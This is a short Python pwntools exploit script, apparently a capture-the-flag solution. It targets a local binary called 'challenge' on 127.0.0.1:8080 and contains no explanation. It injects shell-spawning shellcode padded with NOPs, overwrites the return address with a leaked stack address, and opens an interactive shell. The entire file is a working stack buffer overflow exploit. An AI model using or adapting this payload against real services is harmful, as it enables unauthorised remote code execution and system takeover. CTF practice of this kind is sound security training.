from pwn import *

context.arch = 'amd64'
context.binary = './challenge'

proc = remote("127.0.0.1",8080)
#proc = process("./challenge")
#proc = gdb.debug("./challenge", '''
#        break _start
#        ''')
#print(proc.env)
payload = asm(shellcraft.sh())
payload += asm(shellcraft.nop()) * (136 - len(payload))
line = proc.recvline()
address = int("0x" + line.decode().split(":")[1],16)
payload += p64(address)
proc.recvline()
proc.sendline(payload)
proc.interactive()
